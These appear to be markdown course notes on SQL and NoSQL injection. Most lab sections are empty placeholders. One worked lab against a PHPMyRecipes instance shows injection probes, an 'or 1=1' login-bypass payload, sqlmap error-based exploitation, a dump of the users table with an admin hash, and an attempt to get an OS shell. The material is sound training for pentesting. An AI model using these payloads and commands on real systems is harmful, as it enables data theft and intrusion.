# SQL Injection Attacks

SQL Injection is one of the most commonly exploited injection vulnerabilities in web applications and poses a serious security risk to organizations. As a web application pentester or bug bounty hunter, it is vitally important to understand what causes SQL Injection vulnerabilities, how they can be identified, and how they can be exploited. The ability for attackers to run arbitrary queries against vulnerable systems can result in data exposure, modification, and in some cases, entire system compromise. SQL Injection vulnerabilities are often misunderstood and overlooked by developers primarily due to a lack of knowledge on how SQL queries can be weaponized by attackers.

This course will take you through everything from introducing you to SQL Injection, explaining the difference between In-Band, Blind, and Out-of-band SQLi, and will show you how to identify and exploit SQL Injection vulnerabilities in web applications through a mix of both manual and automated techniques.

---

## Course Introduction

### Course Topic Overview

- Introduction to SQL Injection
- Types of SQL Injection Vulnerabilities
- Introduction to Databases, DBMS, Relational Databases and NoSQL Databases
- SQL Fundamentals
- Hunting for SQL Injection Vulnerabilities
- Identifying and Exploiting In-Band SQL Injection Vulnerabilities (Error-Based and UNION-Based SQLi)
- Identifying and Exploiting Blind SQL Injection Vulnerabilities (Time-Based and Boolean-Based SQLi)
- Identifying and Exploiting SQL Injection Vulnerabilities with Automated Tools (i.e. SQLMap)
- Pentesting NoSQL Databases

### Prerequisites

- Basic familiarity with HTTP/HTTPS
- Basic familiarity with Linux
- Basic familiarity with OWASP ZAP/Burp Suite

### Learning Objectives

- You will have a solid understanding of what a SQL injection vulnerabilities are, what causes them and their potential impact.
- You will have an understanding of how Relational Databases and NoSQL databases work and how they differ from one another.
- You will have an understanding of the three different categories/types of SQL Injection vulnerabilities and their respective subtypes.
- You will be able to understand and write basic SQL queries.
- You will be able to identify and exploit In-Band SQL Injection vulnerabilities (Error-Based and UNION-Based SQLi).
- You will be able to identify and exploit Blind SQL Injection vulnerabilities (Time-Based and Boolean-Based SQLi).
- You will be able to automate the identification and exploitation of SQL Injection vulnerabilities with tools like SQLMap.
- You will be able to identify and exploit vulnerabilities in NoSQL databases.

---
---

## Finding SQLi Vulnerabilities

### Finding SQLi Vulnerabilities Manually


**Mutillidae II**

#### Lab Solution

![Lab - ](./assets/04_sql_injection_lab_.png)

``:
```

```

``:
```

```

``:
```

```

### Finding SQLi Vulnerabilities with OWASP ZAP

#### Lab Solution

![Lab - ](./assets/04_sql_injection_lab_.png)

``:
```

```

``:
```

```

``:
```

```

---

## In-Band SQL Injection

### Exploiting Error-Based SQLi Vulnerabilities

#### Lab Environment

**PHPMyRecipes**

The attacker might not have any user level access to the web application. However, this does not mean that the application cannot be compromised remotely. SQL Injection vulnerabilities could be triggered even by unauthenticated users.

In the exercise below, the attacker is unauthenticated to the web application and needs to find an SQL Injection attack on it.

<u>A version of PHPMyRecipes is vulnerable to an SQL injection attack</u>.

**Objective**: Your task is to find and exploit this vulnerability.

#### Lab Solution

`burpsuite` > `Repeater`

`HTTP Request`:
```http
POST /dosearch.php HTTP/2 ⬅️
Host: foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

words_preformat=' ⬅️
```
`HTTP Response`:
```html
HTTP/2 200 OK
Content-Type: text/html
Date: Tue, 26 Nov 2024 16:02:43 GMT
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Content-Length: 2553

<html>

[...]

    <TD WIDTH=50>&nbsp;</TD>
    <TD WIDTH=600 VALIGN=TOP ALIGN=LEFT>
<P CLASS="content-header" ALIGN=LEFT><FONT COLOR="#DCDCDC">Database Error</FONT></P>
      <TABLE BORDER=2 CELLPADDING=10 BACKGROUND="/images/paper002.jpg" WIDTH=90%>
        <TR><TD>
We seem to have encountered a database error.  Please send email to
<A HREF="mailto:bugs@bonkoif.com">bugs@bonkoif.com</A> with the
following information:<UL>
<LI>File - dosearch.php<LI>Reason - Cannot select recipe lines by instructions/name<LI>Text - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' IN BOOLEAN MODE) ORDER BY name' at line 1</UL><P> ⬅️
        </TD></TR>
      </TABLE>
    </TD>
  </TR>
</TABLE>

<P>&nbsp;</P>
<P>&nbsp;</P>

<P>
<HR>
<FONT CLASS="footer">phpMyRecipes &copy;2004 Todd Palino<BR>
Don't steal anything, because it's free.</FONT></P>

</body>

</html>
```

`burpsuite` > `Intruder` > `Payloads` = `Payload Options: Load: ~/tools/SecLists/Fuzzing/Databases/MySQL.fuzzdb.txt` > `Start attack`

`HTTP Request`:
```http
POST /login.php HTTP/2 ⬅️
Host: foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com
Referer: https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com/login.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username=" or 1=1#&password=TEST ⬅️
```
`HTTP Response`:
```html
HTTP/2 200 OK
Content-Type: text/html
Date: Tue, 26 Nov 2024 16:12:22 GMT
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Content-Length: 2490

<html>

[...]

      <TABLE BORDER=2 CELLPADDING=10 BACKGROUND="/images/paper002.jpg" WIDTH=90%>
        <TR><TD>
We seem to have encountered a database error.  Please send email to
<A HREF="mailto:bugs@bonkoif.com">bugs@bonkoif.com</A> with the
following information:<UL>
<LI>File - login.php<LI>Reason - Cannot perform select<LI>Text - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1</UL><P> ⬅️
        </TD></TR>
      </TABLE>
    </TD>
  </TR>
</TABLE>

<P>&nbsp;</P>
<P>&nbsp;</P>

<P>
<HR>
<FONT CLASS="footer">phpMyRecipes &copy;2004 Todd Palino<BR>
Don't steal anything, because it's free.</FONT></P>

</body>

</html>
```

`vim ./request.txt`:
```http
POST /dosearch.php HTTP/2
Host: foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com
Referer: https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com/findrecipe.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

words_all=&words_exact=TEST&words_any=&words_without=&name_exact=&ing_modifier=2
```

`sqlmap -u 'https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com/dosearch.php' -p 'words_exact' --data='words_exact=' --method=POST --technique=E`

🔄 Alternative 🔄

_SQL injection techniques to use (default "BEUSTQ")_

`sqlmap -r ./request.txt -p 'words_exact' --technique=E`:
```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:52:00 /2024-11-26/

[17:52:00] [INFO] parsing HTTP request from './request.txt'
[17:52:00] [INFO] testing connection to the target URL
[17:52:01] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[17:52:01] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[17:52:01] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
got a 307 redirect to 'https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com/dosearch.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] N
[17:52:05] [INFO] heuristic (basic) test shows that POST parameter 'words_exact' might be injectable (possible DBMS: 'MySQL')
[17:52:05] [INFO] heuristic (XSS) test shows that POST parameter 'words_exact' might be vulnerable to cross-site scripting (XSS) attacks
[17:52:05] [INFO] testing for SQL injection on POST parameter 'words_exact'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:52:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:52:33] [INFO] POST parameter 'words_exact' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
POST parameter 'words_exact' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 37 HTTP(s) requests: ⬅️
---
Parameter: words_exact (POST)
    Type: error-based ⬅️
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: words_all=&words_exact=TEST' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a7a7171,(SELECT (ELT(6150=6150,1))),0x7178707a71,0x78))s), 8446744073709551610, 8446744073709551610)))#&words_any=&words_without=&name_exact=&ing_modifier=2 ⬅️
---
```

`burpsuite` > `Repeater`

`HTTP Request`:
```http
POST /dosearch.php HTTP/2
Host: foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com
Referer: https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com/findrecipe.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

words_all=&words_exact=TEST' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a7a7171,(SELECT (ELT(6150=6150,1))),0x7178707a71,0x78))s), 8446744073709551610, 8446744073709551610)))#&words_any=&words_without=&name_exact=&ing_modifier=2 ⬅️
```
`HTTP Response`:
```html
HTTP/2 200 OK
Content-Type: text/html
Date: Tue, 26 Nov 2024 17:03:06 GMT
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Content-Length: 2490

<html>

[...]

      <TABLE BORDER=2 CELLPADDING=10 BACKGROUND="/images/paper002.jpg" WIDTH=90%>
        <TR><TD>
We seem to have encountered a database error.  Please send email to
<A HREF="mailto:bugs@bonkoif.com">bugs@bonkoif.com</A> with the
following information:<UL>
<LI>File - dosearch.php<LI>Reason - Cannot select recipe lines by instructions/name<LI>Text - BIGINT value is out of range in '(2 * if((select 'qzzqq1qxpzqx' from dual),8446744073709551610,8446744073709551610))'</UL><P> ⬅️
        </TD></TR>
      </TABLE>
    </TD>
  </TR>
</TABLE>

<P>&nbsp;</P>
<P>&nbsp;</P>

<P>
<HR>
<FONT CLASS="footer">phpMyRecipes &copy;2004 Todd Palino<BR>
Don't steal anything, because it's free.</FONT></P>

</body>

</html>
```

`echo -n '0x717a7a7171' | xxd -r -p`:
```
qzzqq
```

`echo -n '0x7178707a71' | xxd -r -p`:
```
qxpzq
```

`echo -n '0x78' | xxd -r -p`:
```
x
```

_Retrieve DBMS current database_

`sqlmap -r ./request.txt -p 'words_exact' --technique=E --current-db`:
```
[...]

[18:09:58] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[18:09:58] [INFO] fetching current database
[18:09:58] [INFO] resumed: 'recipes'
current database: 'recipes' ⬅️
[18:09:58] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com'

[*] ending @ 18:09:58 /2024-11-26/
```

_Enumerate DBMS database tables_

`sqlmap -r ./request.txt -p 'words_exact' --technique=E -D 'recipes' --tables`:
```
[...]

Database: recipes
[7 tables] ⬅️
+--------------------+
| categories         |
| ingredients        |
| recipe_ingredients |
| recipes            |
| sessions           |
| units              |
| users              |
+--------------------+

[18:12:27] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com'

[*] ending @ 18:12:27 /2024-11-26/
```

_Dump DBMS database table entries_

`sqlmap -r ./request.txt -p 'words_exact' --technique=E -D 'recipes' -T 'users' --dump`:
```
[...]

Database: recipes
Table: users
[1 entry]
+----+-------+-------+--------------------+---------------+----------+
| id | email | privs | name               | password      | username |
+----+-------+-------+--------------------+---------------+----------+
| 1  | NULL  | 4096  | phpMyRecipes Admin | 6i1wgDRASJDhE | recipes  | ⬅️
+----+-------+-------+--------------------+---------------+----------+

[18:14:05] [INFO] table 'recipes.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com/dump/recipes/users.csv'
[18:14:05] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com'

[*] ending @ 18:14:05 /2024-11-26/
```

`hash-identifier '6i1wgDRASJDhE'`:
```
   #########################################################################
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] DES(Unix)
--------------------------------------------------
```

_Retrieve DBMS current user_

`sqlmap -r ./request.txt -p 'words_exact' --technique=E --current-user`:
```
[...]

[18:48:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[18:48:30] [INFO] fetching current user
[18:48:31] [INFO] retrieved: 'recipes@localhost'
current user: 'recipes@localhost' ⬅️
[18:48:31] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com'

[*] ending @ 18:48:31 /2024-11-26/
```

_Prompt for an interactive operating system shell_

`sqlmap -r ./request.txt -p 'words_exact' --technique=E --os-shell`:
```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:50:16 /2024-11-26/

[18:50:16] [INFO] parsing HTTP request from './request.txt'
[18:50:16] [INFO] resuming back-end DBMS 'mysql' 
[18:50:16] [INFO] testing connection to the target URL
got a 307 redirect to 'https://foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com/dosearch.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] N
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: words_exact (POST)
    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: words_all=&words_exact=TEST' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a7a7171,(SELECT (ELT(6150=6150,1))),0x7178707a71,0x78))s), 8446744073709551610, 8446744073709551610)))#&words_any=&words_without=&name_exact=&ing_modifier=2
---
[18:50:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[18:50:19] [INFO] going to use a web backdoor for command prompt
[18:50:19] [INFO] fingerprinting the back-end DBMS operating system
[18:50:20] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 

do you want sqlmap to further try to provoke the full path disclosure? [Y/n] Y
[18:50:27] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 

[18:50:31] [INFO] retrieved web server absolute paths: '/dosearch~.php'
[18:50:31] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:50:31] [WARNING] potential permission problems detected ('Access denied')
[18:50:33] [WARNING] unable to upload the file stager on '/var/www/'
[18:50:33] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[18:50:35] [WARNING] unable to upload the file stager on '/var/www/html/'
[18:50:35] [INFO] trying to upload the file stager on '/var/www/htdocs/' via LIMIT 'LINES TERMINATED BY' method
[18:50:37] [WARNING] unable to upload the file stager on '/var/www/htdocs/'
[18:50:37] [INFO] trying to upload the file stager on '/usr/local/apache2/htdocs/' via LIMIT 'LINES TERMINATED BY' method
[18:50:39] [WARNING] unable to upload the file stager on '/usr/local/apache2/htdocs/'
[18:50:39] [INFO] trying to upload the file stager on '/usr/local/www/data/' via LIMIT 'LINES TERMINATED BY' method
[18:50:42] [WARNING] unable to upload the file stager on '/usr/local/www/data/'
[18:50:42] [INFO] trying to upload the file stager on '/var/apache2/htdocs/' via LIMIT 'LINES TERMINATED BY' method
[18:50:44] [WARNING] unable to upload the file stager on '/var/apache2/htdocs/'
[18:50:44] [INFO] trying to upload the file stager on '/var/www/nginx-default/' via LIMIT 'LINES TERMINATED BY' method
[18:50:47] [WARNING] unable to upload the file stager on '/var/www/nginx-default/'
[18:50:47] [INFO] trying to upload the file stager on '/srv/www/htdocs/' via LIMIT 'LINES TERMINATED BY' method
[18:50:50] [WARNING] unable to upload the file stager on '/srv/www/htdocs/'
[18:50:50] [INFO] trying to upload the file stager on '/usr/local/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:50:52] [WARNING] unable to upload the file stager on '/usr/local/var/www/'
[18:50:52] [INFO] trying to upload the file stager on '/' via LIMIT 'LINES TERMINATED BY' method
[18:50:53] [WARNING] unable to upload the file stager on '/'
[18:50:53] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times
[18:50:53] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/foq9rsyx9porvk529i6tt39dc.us-east-8.attackdefensecloudlabs.com'

[*] ending @ 18:50:53 /2024-11-26/
```
❌

### Exploiting Union-Based SQLi Vulnerabilities

#### Lab Environment

**Vulnerable Results Portal: Union Based SQLi**

College Exams are over and the results are out! ABC University had released the exam results on the portal developed by their college students.

One of the student found that the portal was vulnerable to Union-based SQL Injection!

**Note**: The backend database is SQLite.

**Objective**: Leverage the vulnerability to determine the SQLite version and the dump flag from the database!

#### Lab Solution

![Lab - ](./assets/04_sql_injection_lab_.png)

``:
```

```

``:
```

```

``:
```

```

---

## Blind SQL Injection

### Introduction to Boolean-Based SQLi Vulnerabilities

#### Lab Environment

**OpenSupports**

[...]

#### Lab Solution

![Lab - ](./assets/04_sql_injection_lab_.png)

``:
```

```

``:
```

```

``:
```

```

### Exploiting Boolean-Based SQLi Vulnerabilities

#### Lab Environment

**Victor CMS**

[...]

#### Lab Solution

![Lab - ](./assets/04_sql_injection_lab_.png)

``:
```

```

``:
```

```

``:
```

```

### Exploiting Time-Based SQLi Vulnerabilities

#### Lab Environment

**CiMe Citas Medicas**

[...]

#### Lab Solution

![Lab - ](./assets/04_sql_injection_lab_.png)

``:
```

```

``:
```

```

``:
```

```

---

## NoSQL Injection

### NoSQL Fundamentals

#### Lab Environment

**MongoDB Basics**

[...]

#### Lab Solution

![Lab - MongoDB Basics](./assets/04_sql_injection_lab_mongodb_basics_1.png)

``:
```

```

``:
```

```

``:
```

```

### MongoDB NoSQL Injection

#### Lab Environment

**MongoDB NoSQL Injection**

[...]

#### Lab Solution

![Lab - MongoDB NoSQL Injection](./assets/04_sql_injection_lab_mongodb_nosql_injection_1.png)

``:
```

```

``:
```

```

``:
```

```

---
---

## Resources and References

- [SQL Injection Payload List](https://github.com/payloadbox/sql-injection-payload-list)
- [Payloads All The Things - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [SecLists - SQLi](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi)

---
---
